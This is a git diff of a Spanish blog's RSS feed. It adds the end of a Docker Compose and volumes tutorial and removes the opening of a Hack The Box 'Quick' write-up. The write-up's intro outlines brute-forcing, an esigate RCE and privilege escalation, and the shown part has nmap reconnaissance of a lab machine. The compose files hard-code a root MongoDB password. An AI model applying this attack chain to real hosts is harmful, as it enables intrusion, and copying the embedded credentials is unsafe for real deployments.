+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker68.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a crear un estudiante ahora con la ayuda de &lt;code&gt;curl&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker69.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listamos nuevamente los datos en nuesntro navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker70.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que se ejecuta todo correctamente y asi es como pudimos meter nuestra aplicacion en un contenedor y conectarla con otro.&lt;/p&gt;
+
+&lt;h3 id=&quot;docker-compose&quot;&gt;Docker Compose &lt;a href=&quot;#docker-compose&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Es una herramienta que permite definir y administrar aplicaciones Docker multi-contenedor. Con Docker Compose, puedes describir toda la configuración de tu aplicación, incluidos los servicios, las redes y los volúmenes que necesita, en un archivo de configuración YAML.&lt;/p&gt;
+
+&lt;p&gt;En pocas palabras esto nos va a ahorrar el proceso que hicimos anteriormente para conectar nuestros contenedores que en si fueron muchos pasos y con &lt;code&gt;docker compose&lt;/code&gt; podemos automatizarlo todo.&lt;/p&gt;
+
+&lt;p&gt;Para usar esto, debemos de crear un archivo yaml de nombre &lt;code&gt;docker-compose.yml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;YAML: Es un formato de serialización de datos legible por humanos. Fue diseñado para ser un lenguaje simple y fácil de entender que permite representar datos estructurados de manera concisa y clara. YAML se utiliza ampliamente como un formato de configuración, especialmente en el contexto de herramientas y aplicaciones de desarrollo y despliegue, como Docker Compose, Kubernetes, Ansible y muchas otras.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Dentro de este archivo le indicaremos primero la versión que usaremos, en este caso &lt;code&gt;version: &quot;3.9&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues en services indicaremos el nombre de los contenedores que vamos a asignar a los contenedores a usar.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
+services:
+  nodeApp:
+  mongo_connect:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Dentro de cada nombre indicaremos con &lt;code&gt;build ruta_dockerfile&lt;/code&gt;, puertos a mapear &lt;code&gt;ports puerto_hosts:puerto_contenedor&lt;/code&gt; y el nombre del contenedor que usara el servicio de &lt;code&gt;nodeApp&lt;/code&gt; &lt;code&gt;links nombre_contenedor_usa_servicio&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
+services:
+  nodeApp:
+    build: .
+    ports:
+      - &quot;3000:3000&quot;
+    links:
+      - mongo_connect
+  mongo_connect:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;De la misma manera similar para el otro contenedor, solo que en este caso especificaremos la imagen en la que se basara &lt;code&gt;image: mongo&lt;/code&gt; la cual ya teniamos descargada y le indicaremos las variables de entorno que necesitamos &lt;code&gt;environment&lt;/code&gt; las cuales antes establecimos para conectarnos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
+services:
+  nodeapp:
+    build: .
+    ports:
+      - &quot;3000:3000&quot;
+    links:
+      - mongo_connect
+  mongo_connect:
+    image: mongo
+    ports:
+      - &quot;27017:27017&quot;
+    environment:
+      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
+      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Listo ahora guardamos nuestro archivo, pero recordemos que tenemos dos contenedores activos de cuando realizamos la conexión, por ello primero vamos a pararlos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker71.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya que todo esta listo ejecutamos &lt;code&gt;docker-compose up&lt;/code&gt; y esto se encargara de construir nuestros contenedores.&lt;/p&gt;
+
+&lt;p&gt;En versiones mas recientes ejecutar &lt;code&gt;docker compose up&lt;/code&gt; es exactamente lo mismo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker72.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que este comando nos automatiza todo el proceso completo y si ahora verificamos si se esta ejecutando el servicio y este se encuentra funcionando correctamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker73.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Igual podemos realizar peticiones o listar nuevamente y todo funciona de maravilla.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker74.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker75.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora queremos detener la ejecución, como casi clasicamente hacemos usando las teclas &lt;code&gt;ctrl_c&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker76.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos listar las imagenes que tenemos y observamos una nueva que fue creada ejecutamos &lt;code&gt;docker compose&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker77.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y del mismo modo si listamos los contenedores, tambien vemos dos nuevos los cuales tambien se crearon al ejecutar el comando.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker78.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero esto no acaba aqui, ya que asi como &lt;code&gt;docker compose&lt;/code&gt; nos automatiza la creación, tambien podemos eliminar absolutamente todo, tanto los contenedores que creo como la red que se crea por default de manera automatica.&lt;/p&gt;
+
+&lt;p&gt;Y este comando es &lt;code&gt;docker compose down&lt;/code&gt; o en versiones antiguas &lt;code&gt;docker-compose down&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker79.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listamos nuevamente los contenedores y estos ya no se encuentran.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker80.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Asi pudimos aprender lo maravilloso que es &lt;code&gt;docker compose&lt;/code&gt; y como este nos simplifica todo el proceso.&lt;/p&gt;
+
+&lt;h3 id=&quot;volumenes&quot;&gt;Volumenes &lt;a href=&quot;#volumenes&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Generalmente cuando estamos trabajando con contenedores, al eliminarlos estos se borran en conjunto con todos los datos que este contiene. Ya sea cuando estamos creando alguna aplicación que constantemente vamos a estar actualizando, seria muy tedioso estar creando una imagen cada vez que hagamos un cambio.&lt;/p&gt;
+
+&lt;p&gt;Pero si queremos que a pesar de que cuando eliminemos nuestro contenedor, toda nuestra data permanezca intacta y de la misma manera si vamos a estar desarrollando alguna aplicación evitar el fastidio de estar constantemente creando una imagen. Pues docker tiene una solución a esto y es a traves de los &lt;code&gt;Volumenes&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Con los volumenes los que hacemos es que una parte de los archivos que va a tener nuestro contenedor, podemos montarla en nuestro propio sistema principal. Por ello al encotrarse en nuestro sistema hosts no van a eliminarse.&lt;/p&gt;
+
+&lt;p&gt;Esto nos sirve un monton si vamos a trabajar con &lt;code&gt;base de datos&lt;/code&gt; o cuando estamos desarrollando algun sistema.&lt;/p&gt;
+
+&lt;p&gt;Existen tres tipos de maneras de poder crear nuestro volumenes y podemos usaarlos segun lo veamos conveniente.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Anonimo: Indicamos la ruta de lo que queremos almacenar en un volumen y docker se encarga de montarlo en donde lo vea conveniente. Y otro punto es que no vamos a poder referenciar nuestro volumen para que otro contenedor que creemos lo pueda usar.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Anfitrion: En este caso nosotros podemos decidir la ruta de donde se va almacenar nuestro volumen.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Nombrado: Es muy parecido al volumen anonimo, solo que este tiene una mejora y es que si vamos a poder referenciar nuestro volumen, lo que nos ayudara a poder reutilizarlo.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bien para poder usar los volumenes, debemos a volver a abrirnos nuestro archivo previamente creado &lt;code&gt;docker-compose.yml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a agregar la etiqueta &lt;code&gt;volumes&lt;/code&gt; y le asignaremos el nombre del volumen que queremos darle en nuestro caso &lt;code&gt;db-mongo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
+services:
+  nodeapp:
+    build: .
+    ports:
+      - &quot;3000:3000&quot;
+    links:
+      - mongo_connect
+  mongo_connect:
+    image: mongo
+    ports:
+      - &quot;27017:27017&quot;
+    environment:
+      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
+      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
+  volumes:
+    db-mongo:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;De la misma manera agregaremos otra etiqueta &lt;code&gt;volumes&lt;/code&gt; dentro del nombre de nuestro contenedor, donde le indicaremos que volumen va a utilizar, en este caso &lt;code&gt;db_mongo&lt;/code&gt; especificando la ruta en donde por defecto mongo guarda los datos &lt;code&gt;/data/db&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;En caso de que estemos trabajando con una base de datos relacional como mysql, la ruta cambiaria y seria /var/lib/mysql, lo mismo para cualquier gestor de base de datos ya que debemos especificar segun de cual estemos haciendo uso la ruta por defecto donde se almacena la data.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
+services:
+  nodeapp:
+    build: .
+    ports:
+      - &quot;3000:3000&quot;
+    links:
+      - mongo_connect
+  mongo_connect:
+    image: mongo
+    ports:
+      - &quot;27017:27017&quot;
+    environment:
+      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
+      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
+    volumes:
+      - db-mongo:/data/db
+  volumes:
+    db-mongo:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Guardamos nuestro archivo y igual que anteriormente ejecutamos &lt;code&gt;docker compose up&lt;/code&gt;, se desplegan nuestros contenedores.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker81.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a realizar nuevamente algunas peticiones a nuestro aplicativo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker82.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Verificamos que los datos se insertaron correctamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker83.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora para validar que nuestro &lt;code&gt;volumen&lt;/code&gt; es funcional, vamos a eliminar los contenedores y volveremos a levantar otros nuevos con &lt;code&gt;docker compose&lt;/code&gt; y en consecuencia pese a que borramos los primeros con los que interactuamos realizando las peticiones, al desplegar los nuevos podremos seguir trabajando con los mismos datos.&lt;/p&gt;
+
+&lt;p&gt;Entonces primero detenemos la ejecución y eliminamos los contenedores.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker84.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a levantar nuevamente otros dos nuevos contenedores.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker85.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finalmente validemos en nuestro navegador si los datos que insetamos antes siguen almancenado y…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker86.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Genial todo funciona correctamente y de esta manera vemos el impacto que se tiene al usar los &lt;code&gt;volumenes&lt;/code&gt; para tener una persistencia de datos en el tiempo.&lt;/p&gt;
+
+&lt;p&gt;Pero esto no acaba aqui, ya que tambien como mencionaba antes los volumenes tambien nos ayudan en el desarrollo de nuestras aplicaciones.&lt;/p&gt;
+
+&lt;p&gt;Para ello primero necesitaremos crear un nuevo archivo &lt;code&gt;Dockerfile.dev&lt;/code&gt; donde colocaremos todo lo que necesitaremos para el desarrollo, donde vamos a tener un contenido similar a la de nuestro primer dockerfile, pero con algunas variaciones que vamos a ver a continuación.&lt;/p&gt;
+
+&lt;p&gt;Si anteriomente has trabajado con &lt;code&gt;Node&lt;/code&gt;, debes de haber utilizado una herramienta que nos permite detectar los cambios que vamos realizando y esta es &lt;code&gt;nodemon&lt;/code&gt;, asi que vamos a usar un comando el cual va a instalarlo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
+RUN npm i -g nodemon
+RUN mkdir -p /home/myapp
+
+WORKDIR /home/app
+
+COPY . /home/app
+EXPOSE 3000
+CMD [&quot;node&quot;, &quot;/home/myapp/index.js&quot;]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Tambien vamos a necesitar indicarle la ruta en la cual vamos a estar trabajando y eso lo hacemos con el comando &lt;code&gt;WORKDIR&lt;/code&gt; y por lo tanto en &lt;code&gt;CMD&lt;/code&gt; eliminaremos la ruta completa y pasaremos a usar &lt;code&gt;nodemon&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
+
+RUN npm i -g nodemon
+RUN mkdir -p /home/myapp
+
+WORKDIR /home/myapp
+
+EXPOSE 3000
+
+CMD [&quot;nodemon&quot;, &quot;index.js&quot;]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Bueno, ya que vamos a usar un volumen que se encargara de crear un enlace entre el codigo de nuestra aplicación y la ruta &lt;code&gt;/home/myapp&lt;/code&gt;, no necesitamos mas el comando copy.&lt;/p&gt;
+
+&lt;p&gt;y a continuación ahora debemos de crear tambien un nuevo archivo de &lt;code&gt;docker-compose-fordev.yml&lt;/code&gt; pero vamos a varias un poco el contenido.&lt;/p&gt;
+
+&lt;p&gt;Primero, vamos a añadir la etiqueta &lt;code&gt;context&lt;/code&gt; indicandole la ruta de la aplicación y ponemos un punto ya que es la ruta actual, despues indicamos con la etiqueta &lt;code&gt;dockerfile&lt;/code&gt; el archivo dockerfile que ultilizara para crear el contenedor &lt;code&gt;nodeapp&lt;/code&gt;.
+y finalmente añadimos un nuevo volumen dentro del &lt;code&gt;nodeapp&lt;/code&gt; especificando la ruta que sera montada y despues la ruta del contenedor.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
+services:
+  nodeapp:
+    build:
+      context: .
+      dockerfile: Dockerfile.dev
+    ports:
+      - &quot;3000:3000&quot;
+    links:
+      - mongo_connect
+    volumes:
+      - .:/home/myapp
+  mongo_connect:
+    image: mongo
+    ports:
+      - &quot;27017:27017&quot;
+    environment:
+      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
+      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
+    volumes:
+      - db-mongo:/data/db
+  volumes:
+    db-mongo:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ya que tenemos el archivo listo lo guardamos y ejecutamos nuestro comando &lt;code&gt;docker compose&lt;/code&gt; pero esta vez añadiremos el parametro &lt;code&gt;-f&lt;/code&gt; donde le indicaremos el archivo de docker compose personalizado que en nuestro caso seria este que recien creamos &lt;code&gt;docker-compose-fordev.yml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker87.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vemos en nuestro navegador que al igual que antes tenemos los datos que previamente creamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker88.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a añadir en nuestro codigo una linea en consola para que cuando listemos los estudiantes nos muestre un mensaje &lt;code&gt;Listando todos los estudiantes&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker89.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora simplemente al guardar los cambios, automaticamente vemos el cambio reflejado gracias a &lt;code&gt;nodemon&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker90.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero vamos a validarlo como se debe y vamos a hacer que se ejecute el console que modificamos cuando recargamos la pagina , depaso tambien insertaremos un nuevo registro solo para probar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker91.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Recargamos el navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker92.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Toca la prueba de fuego, volvemos a revisar los logs y mira lo que encontramos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Asi podemos tener un ambiente de desarrollo al usar &lt;code&gt;docker compose&lt;/code&gt; y aprendimos a usar esta grandiosa herramienta.&lt;/p&gt;
+
+&lt;p&gt;Si te percataste falta algo importante que seguro te estas preguntando, y es la siguiente..&lt;/p&gt;
+
+&lt;p&gt;Genial ya se como crear mis volumenes en docker pero y estos donde se almacenan por si quiero trabajar sobre estos?&lt;/p&gt;
+
+&lt;p&gt;Pues bueno si estas en &lt;code&gt;linux&lt;/code&gt; solo debes dirigirte a la ruta &lt;code&gt;/var/lib/docker/volumes&lt;/code&gt;. y indicar el nombre del volumen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ahora si estas usando &lt;code&gt;Mac OS&lt;/code&gt; o &lt;code&gt;Windows&lt;/code&gt;, basta con abrir &lt;code&gt;docker desktop&lt;/code&gt; y dirirte a la sección &lt;code&gt;Volumes&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Y bueno esto seria todo por esta oportunidad, espero haberte ayudado a comprender el funcionamiento de esta grandiosa herramienta y ahora si debes ponerte manos a la obra con los contenedores ya que ahora tienes un nuevo superpoder por que ahora dominas &lt;code&gt;Docker&lt;/code&gt;. 😎&lt;/p&gt;
+
+&lt;p&gt;Hasta la proxima! 😄😊.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 22 Jul 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/articulos/Docker</link>
+        <guid isPermaLink="true">http://localhost:4000/articulos/Docker</guid>
+        
+        <category>Docker</category>
+        
+        <category>Contenedor</category>
+        
+        <category>DockerHub</category>
+        
+        
+        <category>articulos</category>
+        
+      </item>
     
       <item>
         <title>Maquina Inject - htb writeup</title>
@@ -5917,765 +6955,6 @@ efa091a0be11892c7056beb574c5bd87
         <category>MS17-010</category>
         
         <category>Eternalblue</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Quick - htb writeup</title>
-        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo &lt;code&gt;Quick&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina potente &lt;code&gt;linux&lt;/code&gt; de dificultad hard, donde vamos a estar obtener informacion a traves del &lt;code&gt;http3&lt;/code&gt; compilando una version de &lt;code&gt;curl&lt;/code&gt;, con la información obtenida vamos a computar correos para mediante fuerza bruta ganar acceso a un pandel de tickets donde explotaremos una vulnerabilidad en &lt;code&gt;esigate&lt;/code&gt; que nos permitira realizar &lt;code&gt;RCE&lt;/code&gt; para ganar acceso al sistema. En la parte de elevación de privilegios nos aprovecharemos de la mala configuración de una impresora, para secuestrar el contenido que imprime y modificarlo para obtener información y migrar a otro usuario y ya como este podremos leer el contenido de un archivo de configuración que nos dara las credenciales del usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Es una maquina bastante entretenida asi que a darle!.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Quick
-❯ ls
- Quick
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.186
-PING 10.10.10.186 (10.10.10.186) 56(84) bytes of data.
-64 bytes from 10.10.10.186: icmp_seq=1 ttl=63 time=118 ms
-
---- 10.10.10.186 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 117.913/117.913/117.913/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt;correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.186 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:46 GMT
-Initiating SYN Stealth Scan at 21:46
-Scanning 10.10.10.186 [65535 ports]
-Discovered open port 22/tcp on 10.10.10.186
-Discovered open port 9001/tcp on 10.10.10.186
-Completed SYN Stealth Scan at 21:47, 17.10s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.186
-Host is up, received user-set (0.14s latency).
-Scanned at 2023-06-16 21:46:51 GMT for 17s
-Not shown: 65533 closed tcp ports (reset)
-PORT     STATE SERVICE    REASON
-22/tcp   open  ssh        syn-ack ttl 63
-9001/tcp open  tor-orport syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds
-           Raw packets sent: 83322 (3.666MB) | Rcvd: 83310 (3.332MB)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,9001 10.10.10.186 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:48 GMT
-Nmap scan report for 10.10.10.186
-Host is up (0.20s latency).
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
-|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
-|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
-9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-title: Quick | Broadband Services
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 30.12 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;21&lt;/td&gt;
-      &lt;td&gt;SSH&lt;/td&gt;
-      &lt;td&gt;OpenSSH 7.6p1&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;9001&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
